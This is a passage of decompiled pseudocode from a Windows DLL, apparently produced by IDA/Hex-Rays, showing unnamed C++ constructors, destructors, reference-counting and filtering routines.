_DWORD *__stdcall sub_1002E3FE(_DWORD *a1)
{
  unsigned int v1; // esi
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10103358;
  do
    v1 *= 2;
  while ( v1 < 4 );
  v2 = 0;
  a1[1] = 0;
  a1[2] = v1;
  v3 = (unsigned __int64)v1 >> 29 != 0 ? -1 : 8 * v1;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = v1;
    `eh vector constructor iterator'(v4 + 1, 8u, v1, (void (__thiscall *)(void *))sub_1002E33E, sub_1000780D);
  }
  a1[3] = v2;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103358: using guessed type int (__thiscall *off_10103358)(void *Block, char);

//----- (1002E489) --------------------------------------------------------
_DWORD *__stdcall sub_1002E489(_DWORD *a1, int a2, volatile LONG *a3, int a4, int a5, volatile LONG *lpAddend, int a7)
{
  volatile LONG *v7; // eax
  int v8; // ecx
  int v9; // ecx
  volatile LONG *v11; // [esp-4h] [ebp-20h]

  v7 = lpAddend;
  v8 = a5;
  *a1 = &off_101033D4;
  a1[2] = v7;
  a1[1] = v8;
  InterlockedIncrement(v7);
  v9 = a2;
  a1[3] = a7;
  a1[4] = a4;
  v11 = a3;
  a1[6] = a3;
  a1[5] = v9;
  InterlockedIncrement(v11);
  sub_1000780D(&a2);
  sub_1000780D(&a5);
  return a1;
}
// 101033D4: using guessed type int (__thiscall *off_101033D4)(void *Block, char);

//----- (1002E4FB) --------------------------------------------------------
_DWORD *__thiscall sub_1002E4FB(_DWORD *Block, char a2)
{
  sub_1002E517(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E517) --------------------------------------------------------
void __thiscall sub_1002E517(_DWORD *this)
{
  *this = &off_101033D4;
  sub_1000780D(this + 5);
  sub_1000780D(this + 1);
}
// 101033D4: using guessed type int (__thiscall *off_101033D4)(void *Block, char);

//----- (1002E54C) --------------------------------------------------------
int __thiscall sub_1002E54C(_DWORD **this, int a2)
{
  unsigned int v2; // esi
  _DWORD *v4; // ebx
  int (__thiscall **v5)(_DWORD *, int, int); // esi
  int v6; // eax
  int v7; // eax

  v2 = *(_DWORD *)(a2 + 12);
  if ( v2 > (*(int (__thiscall **)(_DWORD *))(*this[5] + 12))(this[5]) )
    return 0;
  v4 = this[5];
  v5 = (int (__thiscall **)(_DWORD *, int, int))(*v4 + 4);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v7 = (*v5)(v4, a2, v6);
  if ( !v7 )
    return 0;
  if ( v7 == 1 )
    return 2;
  else
    return 3;
}

//----- (1002E596) --------------------------------------------------------
int __fastcall sub_1002E596(int *a1, _DWORD *a2)
{
  int v4; // eax
  int v5; // ecx
  DWORD v7; // ecx
  void *v8; // eax
  int v10; // [esp+18h] [ebp-18h]
  int v11; // [esp+2Ch] [ebp-4h]

  v4 = *a1;
  v10 = *a1;
  v11 = 0;
  v5 = a2[1];
  if ( !v5 )
    return (*(int (__thiscall **)(_DWORD *, int *))(*a2 + 8))(a2, a1);
  if ( a1[1] != 628 )
    return 1;
  if ( !(*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)v5 + 4))(v5, v4) )
    return 5;
  v7 = a2[3];
  if ( !v7 )
    return (*(int (__thiscall **)(_DWORD *, int *))(*a2 + 8))(a2, a1);
  v8 = (void *)a2[4];
  if ( !v8 )
  {
    Sleep(a2[3]);
    return (*(int (__thiscall **)(_DWORD *, int *))(*a2 + 8))(a2, a1);
  }
  if ( WaitForSingleObjectEx(v8, v7, 1) == 258 )
    return (*(int (__thiscall **)(_DWORD *, int *))(*a2 + 8))(a2, a1);
  return 4;
}
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1002E6B6) --------------------------------------------------------
_DWORD *__thiscall sub_1002E6B6(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5, int a6)
{
  sub_1002EBDD(this, (int)a2, a3, a4, 0);
  a2[15] = a5;
  *a2 = &off_101033E4;
  a2[16] = a6;
  return a2;
}
// 101033E4: using guessed type int (__thiscall *off_101033E4)(void *Block, char);

//----- (1002E6F7) --------------------------------------------------------
_DWORD *__thiscall sub_1002E6F7(_DWORD *Block, char a2)
{
  sub_1002E738(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E713) --------------------------------------------------------
BOOL __thiscall sub_1002E713(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = *(_DWORD *)(a2 + 32);
  return v2 >= this[15] && v2 <= this[16] && sub_1002ED6D(this, a2);
}

//----- (1002E738) --------------------------------------------------------
void *__thiscall sub_1002E738(_DWORD *this)
{
  *this = &off_101033E4;
  return sub_1002ECE0(this);
}
// 101033E4: using guessed type int (__thiscall *off_101033E4)(void *Block, char);

//----- (1002E75C) --------------------------------------------------------
_DWORD *__stdcall sub_1002E75C(_DWORD *a1, int a2)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_101033F4;
  a1[1] = a2;
  return a1;
}
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);

//----- (1002E794) --------------------------------------------------------
int __stdcall sub_1002E794(
        int a1,
        char a2,
        char a3,
        void *a4,
        int a5,
        int a6,
        int a7,
        volatile LONG *a8,
        int a9,
        volatile LONG *lpAddend,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        volatile LONG *a20)
{
  volatile LONG *v20; // edi
  int v21; // eax
  int v22; // ecx
  int v24; // [esp-18h] [ebp-38h]
  volatile LONG *v25; // [esp-14h] [ebp-34h]
  int v26; // [esp-Ch] [ebp-2Ch] BYREF
  volatile LONG *v27; // [esp-8h] [ebp-28h]
  volatile LONG *v28; // [esp-4h] [ebp-24h]
  void *v29; // [esp+10h] [ebp-10h]
  int v30; // [esp+1Ch] [ebp-4h]

  v30 = 3;
  v28 = 0;
  v29 = &v26;
  v27 = lpAddend;
  v26 = a9;
  InterlockedIncrement(lpAddend);
  LOBYTE(v30) = 4;
  v20 = a8;
  v25 = a8;
  v24 = a7;
  InterlockedIncrement(a8);
  LOBYTE(v30) = 3;
  sub_1002E489((_DWORD *)a1, v24, v25, (int)a4, v26, v27, (int)v28);
  LOBYTE(v30) = 6;
  v21 = a7;
  *(_DWORD *)a1 = &off_101033FC;
  v28 = v20;
  *(_DWORD *)(a1 + 32) = v20;
  *(_DWORD *)(a1 + 28) = v21;
  InterlockedIncrement(v28);
  LOBYTE(v30) = 7;
  sub_1000728E((_DWORD *)(a1 + 36), 0);
  LOBYTE(v30) = 8;
  *(_DWORD *)(a1 + 44) = a11;
  *(_DWORD *)(a1 + 48) = a12;
  *(_DWORD *)(a1 + 52) = a13;
  *(_BYTE *)(a1 + 60) = a2;
  *(_DWORD *)(a1 + 56) = a14;
  sub_1000809E(&a15, (_DWORD *)(a1 + 64));
  LOBYTE(v30) = 9;
  v22 = a19;
  *(_DWORD *)(a1 + 80) = a5;
  *(_DWORD *)(a1 + 84) = a6;
  v28 = a20;
  *(_DWORD *)(a1 + 92) = a20;
  *(_DWORD *)(a1 + 88) = v22;
  InterlockedIncrement(v28);
  *(_BYTE *)(a1 + 96) = a3;
  LOBYTE(v30) = 2;
  sub_1000780D(&a7);
  LOBYTE(v30) = 1;
  sub_1000780D(&a9);
  LOBYTE(v30) = 0;
  sub_100068A5(&a15);
  v30 = -1;
  sub_1000780D(&a19);
  return a1;
}
// 101033FC: using guessed type int (__thiscall *off_101033FC)(void *Block, char);

//----- (1002E89B) --------------------------------------------------------
_DWORD *__thiscall sub_1002E89B(_DWORD *Block, char a2)
{
  sub_1002E8B7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E8B7) --------------------------------------------------------
void __thiscall sub_1002E8B7(_DWORD *this)
{
  *this = &off_101033FC;
  sub_1000780D(this + 22);
  sub_100068A5(this + 16);
  sub_1000780D(this + 9);
  sub_1000780D(this + 7);
  sub_1002E517(this);
}
// 101033FC: using guessed type int (__thiscall *off_101033FC)(void *Block, char);

//----- (1002E912) --------------------------------------------------------
int __thiscall sub_1002E912(int this, int **a2)
{
  int *v3; // esi
  void *v4; // eax
  volatile LONG *v5; // ecx
  volatile LONG *v6; // ecx
  _DWORD *v7; // eax
  char v8; // di
  int *v9; // ecx
  _DWORD *v10; // eax
  int *v11; // ecx
  int v12; // edi
  int v13; // edi
  int v14; // ebx
  volatile LONG *v16; // [esp-28h] [ebp-178h] BYREF
  volatile LONG *v17; // [esp-24h] [ebp-174h]
  _DWORD *v18; // [esp-20h] [ebp-170h]
  int v19; // [esp-1Ch] [ebp-16Ch]
  _DWORD *v20; // [esp-18h] [ebp-168h]
  int v21; // [esp-14h] [ebp-164h]
  int *v22; // [esp-10h] [ebp-160h]
  int v23; // [esp-Ch] [ebp-15Ch]
  int *v24; // [esp-8h] [ebp-158h] BYREF
  int v25; // [esp-4h] [ebp-154h]
  int v26[44]; // [esp+10h] [ebp-140h] BYREF
  int v27; // [esp+C0h] [ebp-90h]
  int v28; // [esp+C4h] [ebp-8Ch]
  int v29; // [esp+118h] [ebp-38h]
  int v30; // [esp+120h] [ebp-30h]
  _DWORD v31[2]; // [esp+124h] [ebp-2Ch] BYREF
  void *v32[2]; // [esp+12Ch] [ebp-24h] BYREF
  unsigned __int64 v33; // [esp+134h] [ebp-1Ch]
  void *v34; // [esp+13Ch] [ebp-14h]
  int v35; // [esp+14Ch] [ebp-4h]

  v3 = *a2;
  a2 = (int **)*a2;
  v35 = 1;
  v4 = operator new(0x50u);
  v5 = (volatile LONG *)v25;
  HIDWORD(v33) = v4;
  if ( v4 )
  {
    v25 = 10;
    v24 = *(int **)(this + 16);
    v23 = *(unsigned __int8 *)(this + 96);
    v22 = v3;
    v21 = *(unsigned __int8 *)(this + 60);
    v20 = (_DWORD *)(this + 64);
    v19 = 1;
    v18 = (_DWORD *)(this + 44);
    v17 = v5;
    v16 = v5;
    v34 = &v16;
    sub_1000A205((_DWORD *)(this + 28), &v16);
    LOBYTE(v35) = 1;
    v34 = (void *)sub_1003F152(v6, SHIDWORD(v33), (int)v16, v17, v18, v19, v20, v21, (int)v22, v23, v24, (int *)v25);
  }
  else
  {
    v34 = 0;
  }
  LOBYTE(v35) = 0;
  v7 = operator new(4u);
  HIDWORD(v33) = v7;
  LOBYTE(v35) = 3;
  if ( v7 )
    *v7 = 1;
  else
    v7 = 0;
  v32[1] = v7;
  v32[0] = v34;
  LOBYTE(v35) = 5;
  v33 = 0i64;
  HIDWORD(v33) = a2[7];
  v8 = BYTE4(v33);
  LODWORD(v33) = a2[8];
  if ( *(_QWORD *)(this + 80) < v33 )
  {
    sub_10029BB6((__int32)&a2 + 3, (int)&a2 + 3);
    v25 = (int)v9;
    v24 = v9;
    a2 = &v24;
    sub_1000728E(&v24, 0);
    LOBYTE(v35) = 5;
    sub_1004F966((_DWORD *)dword_10182DE8, 118, v8, v33, (int)v24, v25);
    v10 = sub_1002E75C(v31, 15);
    LOBYTE(v35) = 7;
    sub_1002EB83((int)v10, 125);
  }
  sub_1003CA1A(
    (int)v26,
    (int)(a2 + 150),
    *(_DWORD *)(this + 44),
    *(_DWORD *)(this + 48),
    *(_DWORD *)(this + 52),
    *(volatile LONG **)(this + 56),
    *(_DWORD *)(this + 16));
  LOBYTE(v35) = 8;
  sub_1000728E(v31, 0);
  LOBYTE(v35) = 9;
  v25 = (int)v11;
  v24 = v11;
  HIDWORD(v33) = &v24;
  sub_1002D137((int *)v32, &v24);
  LOBYTE(v35) = 9;
  sub_10030A49((int)v26, (int)v24, v25);
  LOBYTE(v35) = 8;
  sub_1000780D(v31);
  v12 = *(_DWORD *)(this + 88);
  if ( v12 )
  {
    v27 = sub_10032B59(v12);
    v28 = 0;
  }
  v13 = sub_10030ACC(v26);
  v14 = *(_DWORD *)(this + 88);
  if ( v13 == 2 )
  {
    sub_10032C8B((int)a2, v14);
    LOBYTE(v35) = 5;
    sub_1003CC01(v26);
    v35 = 0;
    sub_1003406C(v32);
    return 0;
  }
  else
  {
    if ( v14 )
      sub_10031DF3((int)a2, v14, v27);
    if ( v13 == 4 )
    {
      v29 = 4;
      LOBYTE(v35) = 5;
      sub_1003CC01(v26);
      LOBYTE(v35) = 0;
      sub_1003406C(v32);
      return 4;
    }
    else
    {
      v30 = 2;
      LOBYTE(v35) = 5;
      sub_1003CC01(v26);
      LOBYTE(v35) = 0;
      sub_1003406C(v32);
      return 2;
    }
  }
}
// 1002E977: variable 'v6' is possibly undefined
// 1002E9EB: variable 'v9' is possibly undefined
// 1002EA5C: variable 'v11' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1002E912: using guessed type _DWORD var_2C[2];
// 1002E912: using guessed type int var_140[44];

//----- (1002EB80) --------------------------------------------------------
char sub_1002EB80()
{
  return 52;
}

//----- (1002EB83) --------------------------------------------------------
void __cdecl __noreturn sub_1002EB83(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1002EBA5(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVWZUKxzzjedqr_BurqUpfqufhkrx_wvnem__);
}
// 1002EB83: using guessed type _DWORD pExceptionObject[2];

//----- (1002EBA5) --------------------------------------------------------
_DWORD *__thiscall sub_1002EBA5(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_101033F4;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);

//----- (1002EBDD) --------------------------------------------------------
int __thiscall sub_1002EBDD(_DWORD *this, int a2, _DWORD *a3, _DWORD *a4, char a5)
{
  unsigned int i; // esi
  int v7; // eax
  int v8; // eax
  int v10; // [esp+10h] [ebp-18h] BYREF
  LONG v11[4]; // [esp+14h] [ebp-14h] BYREF
  int v12; // [esp+24h] [ebp-4h]
  int v13; // [esp+3Ch] [ebp+14h]

  *(_DWORD *)(a2 + 4) = -1;
  *(_DWORD *)a2 = &off_10103198;
  *(_BYTE *)(a2 + 8) = 0;
  *(_BYTE *)(a2 + 9) = 1;
  v12 = 0;
  *(_DWORD *)a2 = &off_1010340C;
  sub_1000809E(this, (_DWORD *)(a2 + 12));
  LOBYTE(v12) = 1;
  *(_DWORD *)(a2 + 28) = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1000809E(a4, (_DWORD *)(a2 + 32));
  LOBYTE(v12) = 2;
  *(_DWORD *)(a2 + 48) = *a3;
  *(_DWORD *)(a2 + 52) = a3[1];
  *(_BYTE *)(a2 + 56) = a5;
  sub_1000D17D(&v10, &word_101785C8);
  LOBYTE(v12) = 3;
  for ( i = 0; i < (*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 32) + 4))(a2 + 32); ++i )
  {
    v7 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(a2 + 32) + 44))(a2 + 32, i);
    sub_10001236((LONG *)(v7 + 4), v11);
    v13 = sub_1000E111((int)&v10);
    v8 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(a2 + 32) + 44))(a2 + 32, i);
    sub_10001236((LONG *)(v13 + 4), (LONG *)(v8 + 4));
  }
  LOBYTE(v12) = 2;
  sub_1000D3AD(&v10);
  return a2;
}
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);
// 1010340C: using guessed type int (__thiscall *off_1010340C)(void *Block, char);
// 1002EBDD: using guessed type LONG var_14[4];

//----- (1002ECC4) --------------------------------------------------------
_DWORD *__thiscall sub_1002ECC4(_DWORD *Block, char a2)
{
  sub_1002ECE0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002ECE0) --------------------------------------------------------
void *__thiscall sub_1002ECE0(_DWORD *this)
{
  void *result; // eax

  *this = &off_1010340C;
  sub_100068A5(this + 8);
  result = sub_100068A5(this + 3);
  *this = &off_10103198;
  return result;
}
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);
// 1010340C: using guessed type int (__thiscall *off_1010340C)(void *Block, char);

//----- (1002ED22) --------------------------------------------------------
char __userpurge sub_1002ED22@<al>(int a1@<esi>, int a2)
{
  int v2; // ebx
  int v4; // eax

  v2 = 0;
  if ( !*(_DWORD *)(a1 + 28) )
    return *(_BYTE *)(a1 + 56);
  if ( !sub_1000D687(a2) || !*(_DWORD *)(a1 + 28) )
    return 0;
  while ( 1 )
  {
    v4 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(a1 + 12) + 48))(a1 + 12, v2);
    if ( sub_1000DE70(a2, v4) )
      break;
    if ( (unsigned int)++v2 >= *(_DWORD *)(a1 + 28) )
      return 0;
  }
  return 1;
}

//----- (1002ED6D) --------------------------------------------------------
bool __thiscall sub_1002ED6D(_DWORD *this, int a2)
{
  unsigned int v3; // ecx
  bool result; // al

  result = ((*(_DWORD *)a2 & 0x10) != 0 || (v3 = this[13], *(_QWORD *)(a2 + 20) >= __PAIR64__(v3, this[12])))
        && ((*(_DWORD *)a2 & 0x10) != 0 || sub_1002ED22((int)this, a2 + 608))
        && sub_1002EDC4((int)(this + 8), a2 + 600) != 0;
  return result;
}

//----- (1002EDC4) --------------------------------------------------------
char __usercall sub_1002EDC4@<al>(int a1@<edi>, int a2)
{
  wint_t *v2; // esi
  const WCHAR *v3; // ebx
  int v4; // eax
  unsigned int v5; // eax
  unsigned int v7; // [esp-4h] [ebp-10h]
  int v8; // [esp+8h] [ebp-4h]

  v8 = 0;
  if ( !(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
    return 1;
  while ( 1 )
  {
    v2 = *(wint_t **)(*(_DWORD *)((*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 48))(a1, v8) + 4) + 12);
    v3 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
    v4 = (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 48))(a1, v8);
    v7 = sub_1000D687(v4);
    v5 = sub_1000D687(a2);
    if ( sub_1002FCEE(v2, v3, v5, v7) )
      break;
    if ( ++v8 >= (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
      return 1;
  }
  return 0;
}

//----- (1002EE31) --------------------------------------------------------
int __stdcall sub_1002EE31(
        int a1,
        int ACP,
        int a3,
        _DWORD *a4,
        int *a5,
        char a6,
        int a7,
        volatile LONG *a8,
        int a9,
        volatile LONG *lpAddend)
{
  int v10; // ebx
  int v11; // eax
  int v12; // ecx
  unsigned int v13; // esi
  int v14; // eax
  _DWORD *v15; // esi
  int v16; // eax
  bool v17; // bl
  _DWORD *v18; // eax
  int v20; // [esp-18h] [ebp-4Ch] BYREF
  volatile LONG *v21; // [esp-14h] [ebp-48h]
  int *v22; // [esp-10h] [ebp-44h]
  int v23; // [esp-Ch] [ebp-40h] BYREF
  volatile LONG *v24; // [esp-8h] [ebp-3Ch]
  int v25; // [esp-4h] [ebp-38h]
  int v26[8]; // [esp+10h] [ebp-24h] BYREF
  int v27; // [esp+30h] [ebp-4h]

  v27 = 1;
  v25 = ACP;
  v26[5] = (int)&v23;
  v24 = lpAddend;
  v23 = a9;
  InterlockedIncrement(lpAddend);
  LOBYTE(v27) = 2;
  v22 = a5;
  v10 = a7;
  a5 = &v20;
  v21 = a8;
  v20 = a7;
  InterlockedIncrement(a8);
  LOBYTE(v27) = 1;
  sub_1002E489((_DWORD *)a1, v20, v21, (int)v22, v23, v24, v25);
  LOBYTE(v27) = 4;
  *(_BYTE *)(a1 + 28) = a6;
  v11 = dword_101842F4;
  *(_DWORD *)a1 = &off_1010341C;
  v12 = v10;
  if ( *(_DWORD *)(v11 + 178) )
  {
    v13 = *(_DWORD *)(v11 + 178);
    if ( v13 < (*(int (__thiscall **)(int))(*(_DWORD *)v10 + 12))(v10) )
    {
      v14 = v13;
      goto LABEL_6;
    }
    v12 = v10;
  }
  v14 = (*(int (__thiscall **)(int))(*(_DWORD *)v10 + 12))(v12);
LABEL_6:
  v15 = a4;
  *(_DWORD *)(a1 + 32) = v14;
  *(_DWORD *)(a1 + 36) = a3;
  sub_1000809E(v15, (_DWORD *)(a1 + 40));
  LOBYTE(v27) = 5;
  ACP = GetACP();
  v16 = sub_1000B1F3((void *)4, (int)v26, &ACP);
  LOBYTE(v27) = 6;
  v17 = sub_1002E54C((_DWORD **)a1, v16) != 0;
  LOBYTE(v27) = 5;
  sub_1000B3DF(v26);
  if ( v17 )
  {
    v18 = sub_1000E7F7(&a6, 1, 0);
    LOBYTE(v27) = 7;
    v25 = 41;
    sub_10007882((int)v18);
  }
  LOBYTE(v27) = 0;
  sub_1000780D(&a7);
  v27 = -1;
  sub_1000780D(&a9);
  return a1;
}
// 1010341C: using guessed type int (__thiscall *off_1010341C)(void *Block, char);
// 101842F4: using guessed type int dword_101842F4;

//----- (1002EF56) --------------------------------------------------------
_DWORD *__thiscall sub_1002EF56(_DWORD *Block, char a2)
{
  sub_1002EF72(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002EF72) --------------------------------------------------------
void __thiscall sub_1002EF72(_DWORD *this)
{
  *this = &off_1010341C;
  sub_100068A5(this + 10);
  sub_1002E517(this);
}
// 1010341C: using guessed type int (__thiscall *off_1010341C)(void *Block, char);

//----- (1002EFA6) --------------------------------------------------------
int __thiscall sub_1002EFA6(unsigned __int8 *this, LONG **a2)
{
  int v2; // ebp
  LONG *v4; // edi
  void *v5; // ecx
  int v6; // edx
  int v7; // esi
  int v9; // [esp-4h] [ebp-9Ch]
  int v10[15]; // [esp+10h] [ebp-88h] BYREF
  int v11; // [esp+4Ch] [ebp-4Ch] BYREF
  int v12[5]; // [esp+50h] [ebp-48h] BYREF
  int v13; // [esp+64h] [ebp-34h] BYREF
  LONG v14; // [esp+68h] [ebp-30h] BYREF
  int v15; // [esp+6Ch] [ebp-2Ch] BYREF
  LONG v16[2]; // [esp+70h] [ebp-28h] BYREF
  int v17[7]; // [esp+78h] [ebp-20h] BYREF
  int v18; // [esp+94h] [ebp-4h]

  v4 = *a2;
  sub_1000B1F3(0, (int)v12, 0);
  v18 = 0;
  sub_1000D17D(&v13, &word_1017DB80);
  LOBYTE(v18) = 1;
  sub_1000D17D(&v15, &word_1017DB80);
  v18 = 3;
  v11 = 0;
  sub_10001236(v4 + 151, &v14);
  sub_10001236(v4 + 153, v16);
  v9 = *((_DWORD *)this + 4);
  v5 = (void *)*((_DWORD *)this + 8);
  v16[1] = v4[154];
  sub_10036D74(v5, v6, v10, (_DWORD *)this + 10, v9);
  LOBYTE(v18) = 4;
  sub_10036E6F((__int32)v10, v2, v10, v17, &v11, this[28], *((void **)this + 9), (int)v4);
  LOBYTE(v18) = 5;
  if ( v17[3] )
  {
    v7 = (*(int (__thiscall **)(unsigned __int8 *, int *))(*(_DWORD *)this + 12))(this, v17);
    LOBYTE(v18) = 4;
    sub_1000B3DF(v17);
    LOBYTE(v18) = 3;
    sub_10036E2B(v10);
    v18 = 10;
    sub_1000D3AD(&v15);
    LOBYTE(v18) = 9;
  }
  else
  {
    LOBYTE(v18) = 4;
    sub_1000B3DF(v17);
    LOBYTE(v18) = 3;
    sub_10036E2B(v10);
    v18 = 7;
    sub_1000D3AD(&v15);
    LOBYTE(v18) = 6;
    v7 = 0;
  }
  sub_1000D3AD(&v13);
  v18 = -1;
  sub_1000B3DF(v12);
  return v7;
}
// 1002F027: variable 'v6' is possibly undefined
// 1002F048: variable 'v2' is possibly undefined
// 1002EFA6: using guessed type int var_48[5];
// 1002EFA6: using guessed type int var_88[15];

//----- (1002F0E2) --------------------------------------------------------
void __stdcall sub_1002F0E2(int *a1)
{
  sub_1000D3AD(a1 + 8);
  sub_1000D3AD(a1 + 6);
  sub_1000B3DF(a1 + 1);
}

//----- (1002F120) --------------------------------------------------------
char sub_1002F120()
{
  return 51;
}

//----- (1002F123) --------------------------------------------------------
int __thiscall sub_1002F123(int *this)
{
  *this = (int)off_1010343C;
  sub_1000B3DF(this + 3);
  return sub_10040543(this + 1);
}
// 1010343C: using guessed type int (__thiscall *off_1010343C[2])(void *Block, char);

//----- (1002F158) --------------------------------------------------------
int *__thiscall sub_1002F158(int *Block, char a2)
{
  sub_1002F123(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F174) --------------------------------------------------------
int __stdcall sub_1002F174(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        char a6,
        void *a7,
        void *a8,
        int a9,
        volatile LONG *a10,
        int a11,
        volatile LONG *lpAddend,
        int a13,
        volatile LONG *a14)
{
  int v14; // esi
  int v15; // eax
  int v16; // ecx
  volatile LONG *v17; // eax
  int v19; // [esp-18h] [ebp-34h]
  volatile LONG *v20; // [esp-14h] [ebp-30h]
  int v21; // [esp-Ch] [ebp-28h]
  volatile LONG *v22; // [esp-8h] [ebp-24h]

  v22 = lpAddend;
  v21 = a11;
  InterlockedIncrement(lpAddend);
  v14 = a9;
  v20 = a10;
  v19 = a9;
  InterlockedIncrement(a10);
  sub_1002E489((_DWORD *)a1, v19, v20, (int)a8, v21, v22, (int)a7);
  *(_DWORD *)a1 = &off_1010342C;
  v15 = (*(int (__thiscall **)(int))(*(_DWORD *)v14 + 12))(v14);
  v16 = a13;
  *(_DWORD *)(a1 + 32) = a2;
  *(_DWORD *)(a1 + 36) = a3;
  *(_DWORD *)(a1 + 40) = a4;
  *(_DWORD *)(a1 + 44) = a5;
  *(_DWORD *)(a1 + 28) = v15;
  v17 = a14;
  *(_BYTE *)(a1 + 48) = a6;
  *(_DWORD *)(a1 + 56) = v17;
  *(_DWORD *)(a1 + 52) = v16;
  InterlockedIncrement(v17);
  sub_1000780D(&a9);
  sub_1000780D(&a11);
  sub_1000780D(&a13);
  return a1;
}
// 1010342C: using guessed type int (__thiscall *off_1010342C)(void *Block, char);

//----- (1002F232) --------------------------------------------------------
_DWORD *__thiscall sub_1002F232(_DWORD *Block, char a2)
{
  sub_1002F24E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F24E) --------------------------------------------------------
void __thiscall sub_1002F24E(_DWORD *this)
{
  *this = &off_1010342C;
  sub_1000780D(this + 13);
  sub_1002E517(this);
}
// 1010342C: using guessed type int (__thiscall *off_1010342C)(void *Block, char);

//----- (1002F282) --------------------------------------------------------
int __userpurge sub_1002F282@<eax>(int a1@<ecx>, int a2@<ebp>, void *a3)
{
  int v3; // esi
  _DWORD *v4; // edi
  int v5; // edx
  void *v6; // ecx
  void *v7; // eax
  void *v8; // ecx
  LONG *v9; // eax
  int v10; // ecx
  int v11; // ecx
  int v13; // eax
  int v14; // esi
  int v15; // [esp-Ch] [ebp-94h] BYREF
  int v16; // [esp-8h] [ebp-90h]
  void *v17; // [esp-4h] [ebp-8Ch]

  v3 = a1;
  *(_DWORD *)(a2 + 92) = a1;
  v4 = **(_DWORD ***)(a2 + 104);
  *(_DWORD *)(a2 + 56) = v4;
  sub_1000D17D((_DWORD *)(a2 + 60), &word_1017DB80);
  *(_DWORD *)(a2 - 4) = 0;
  sub_1000B1F3(0, a2 + 72, 0);
  *(_DWORD *)(a2 - 4) = 2;
  sub_10001236(v4 + 151, (LONG *)(a2 + 64));
  *(_DWORD *)(a2 + 68) = v4[154];
  *(_BYTE *)(a2 - 4) = 3;
  sub_1001AC1E(a2 - 88);
  *(_BYTE *)(a2 - 4) = 4;
  sub_1001A969((void *)(a2 - 88), (_DWORD *)(a2 - 52), 1);
  *(_BYTE *)(a2 - 4) = 5;
  if ( !sub_1000DE70((int)&unk_10186B90, (int)(v4 + 152))
    && !sub_1000DE70((int)&unk_10186BD8, (int)(v4 + 152))
    && !sub_1000DE70((int)&unk_10186BC0, (int)(v4 + 152)) )
  {
    v6 = *(void **)(v3 + 45);
    if ( *(_DWORD *)(v3 + 28) < (unsigned int)v6 )
      v6 = *(void **)(v3 + 28);
    sub_1003FA30(v6, v5, (_DWORD *)a2);
    *(_BYTE *)(a2 - 4) = 13;
    v7 = sub_1003FA8C(
           (IStream *)a2,
           (void *)(a2 + 32),
           (_DWORD *)(a2 + 60),
           *(_DWORD *)(v3 + 32),
           *(_DWORD *)(v3 + 36),
           *(_BYTE *)(v3 + 40),
           *(_DWORD *)(v3 + 41));
    *(_BYTE *)(a2 - 4) = 14;
    v17 = v7;
    sub_1002040F((void *)(a2 - 52));
    *(_BYTE *)(a2 - 4) = 13;
    sub_1000B3DF((int *)(a2 + 32));
    *(_BYTE *)(a2 - 4) = 5;
    sub_1002F123((int *)a2);
    goto LABEL_19;
  }
  *(_DWORD *)(a2 + 104) = 0;
  while ( 1 )
  {
    v8 = *(void **)(v3 + 45);
    if ( *(_DWORD *)(v3 + 28) < (unsigned int)v8 )
      v8 = *(void **)(v3 + 28);
    sub_1003FA30(v8, v5, (_DWORD *)(a2 - 120));
    *(_BYTE *)(a2 - 4) = 6;
    v9 = (LONG *)sub_1002F611(v4, v3, (void *)(a2 + 12), (_DWORD **)(a2 + 104), a2 + 60);
    *(_BYTE *)(a2 - 4) = 7;
    sub_1000B3BD(v9, a2 + 72);
    *(_BYTE *)(a2 - 4) = 6;
    sub_1000B3DF((int *)(a2 + 12));
    if ( *(int *)(a2 + 104) > 0 )
    {
      sub_1003FA8C(
        (IStream *)(a2 - 120),
        (void *)(a2 + 32),
        (_DWORD *)(a2 + 60),
        *(_DWORD *)(*(_DWORD *)(a2 + 92) + 32),
